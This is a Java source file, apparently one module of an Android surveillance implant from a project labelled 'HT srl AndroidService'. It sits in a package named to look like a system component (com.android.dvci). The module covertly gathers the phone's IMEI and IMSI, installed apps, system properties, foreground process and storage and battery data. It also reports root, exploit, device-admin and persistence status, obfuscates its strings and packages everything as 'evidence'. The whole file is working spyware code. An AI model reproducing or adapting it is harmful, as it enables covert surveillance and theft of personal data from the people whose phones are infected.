/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.dvci.module;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import com.android.dvci.Device;
import com.android.dvci.RunningProcesses;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.crypto.Keys;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.listener.AR;
import com.android.dvci.util.Check;
import com.android.dvci.util.PackageUtils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map.Entry;
import java.util.Properties;

import static com.android.dvci.capabilities.PackageInfo.*;


/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 *
 * @author zeno
 */
public class ModuleDevice extends BaseInstantModule {

	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "ModuleDevice"; //$NON-NLS-1$

	/**
	 * The process list.
	 */
	private boolean processList = true;

	/**
	 * The cpu usage.
	 */
	private float cpuUsage;

	/**
	 * The cpu total.
	 */
	private long cpuTotal;

	/**
	 * The cpu idle.
	 */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public ModuleDevice() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		// this.processList = true;
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualStart() {

		final StringBuffer sb = new StringBuffer();

		try {
			// OS Version etc...
			if (Cfg.DEBUG) {
				Check.log(TAG + " Android");//$NON-NLS-1$
			}

			final Runtime runtime = Runtime.getRuntime();

			readCpuUsage();

			if (Cfg.DEBUG) {
				sb.append("Debug\n"); //$NON-NLS-1$
				final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
				if (timestamp != null) {
					sb.append("Timestamp: " + timestamp + "\n"); //$NON-NLS-1$
				}
			}

			long freeSpace = getSystem(sb);
			int battery = getBattery(sb);
			getProperties(sb);
			getProcessList(sb);

			ComponentName devAdminReceiver = new ComponentName(Status.getAppContext(), AR.class);
			DevicePolicyManager dpm = (DevicePolicyManager) Status.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
			boolean admin = dpm.isAdminActive(devAdminReceiver);
			boolean root = checkRoot();
			boolean su = Status.self().haveSu();

			if(Cfg.DEMO) {
				sb.insert(0, M.e("BinaryPatched:") + Keys.self().binarypatch[8] + "\n");
			}
			sb.insert(0, M.e("Model:") + Build.DISPLAY + "\n");
			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
			sb.insert(0, M.e("Root: ") + (root ? "yes" : "no") 	+ M.e(", Su: ") + (su ? "yes" : "no")
					+ M.e(", Admin: ") + (admin ? "yes" : "no") +  M.e(", Persistence: ") + Status.getPersistencyStatusStr() + "\n");
			sb.insert(0, M.e("Free space: ") + freeSpace + " KB " + M.e("Installation: ") + "\n");
			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");


		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + ex);
			}
		}

		final String content = sb.toString();

		// log
		final EvidenceBuilder log = new EvidenceBuilder(EvidenceType.DEVICE);
		log.write(WChar.getBytes(content, true));
		log.close();

	}

	private void getProcessList(final StringBuffer sb) {
		if (processList) {
			sb.append("\n" + M.e("-- INSTALLED APPS --") + "\n"); //$NON-NLS-1$
			final ArrayList<PackageUtils.PInfo> apps = PackageUtils.getInstalledApps(false);
			final int max = apps.size();

			for (int i = 0; i < max; i++) {
				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
			}
		}
	}

	private void getProperties(final StringBuffer sb) {
		final Properties properties = System.getProperties();

		sb.append("\n" + M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();

		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}
	}

	private long getSystem(final StringBuffer sb) {
		// SYSTEM
		sb.append("\n" + M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$

		sb.append(M.e("Root Status: ") + Status.getExploitStatusString() + M.e(", Result: ") + Status.getExploitResultString() + "\n");
		sb.append(M.e("Board: ") + Build.BOARD + "\n");
		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
		sb.append(M.e("Display: ") + Build.MODEL + "\n");
		sb.append(M.e("Model:") + Build.DISPLAY + "\n");

		sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Device.self().getImei().length() == 0) {
			sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		sb.append(M.e("CpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(M.e("CpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(M.e("CpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
		sb.append(M.e("Internal space: ") + bytesAvailableInt + "\n");

		stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
		long bytesAvailableExt = (long) stat.getBlockSize() * (long) stat.getBlockCount();

		sb.append(M.e("External state: ") + Environment.getExternalStorageState() + "\n");
		sb.append(M.e("External space: ") + bytesAvailableExt + "\n");

		RunningProcesses runningProcesses = RunningProcesses.self();
		sb.append(M.e("Foreground process: ") + runningProcesses.getForeground() + "\n"); //$NON-NLS-1$

		ModuleMic mic = ModuleMic.self();
		if (mic != null) {
			sb.append("MIC blacklist: ");
			for (String black : mic.blacklist) {
				sb.append(black + " ");
			}
			sb.append("\n");
		}

		return bytesAvailableInt / 1024;
	}

	private int getBattery(final StringBuffer sb) {
		sb.append("\n" + M.e("-- BATTERY --") + "\n");

		IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		Intent batteryStatus = Status.self().getAppContext().registerReceiver(null, ifilter);
		// Are we charging / charged?
		int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
		boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
				status == BatteryManager.BATTERY_STATUS_FULL;

		sb.append(M.e("Charging: ") + isCharging + "\n");

		// How are we charging?
		int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
		boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
		boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;

		sb.append(M.e("Charging USB: ") + usbCharge + "\n");
		sb.append(M.e("Charging AC: ") + acCharge + "\n");

		int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
		int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);


		float levelBattery = level / (float) scale;
		sb.append(M.e("level: ") + levelBattery + "\n");

		int batteryPct = level * 100 / scale;
		return batteryPct;
	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
					M.e("/proc/stat"))), //$NON-NLS-1$
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" "); //$NON-NLS-1$

			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
			}
		}
	}


}
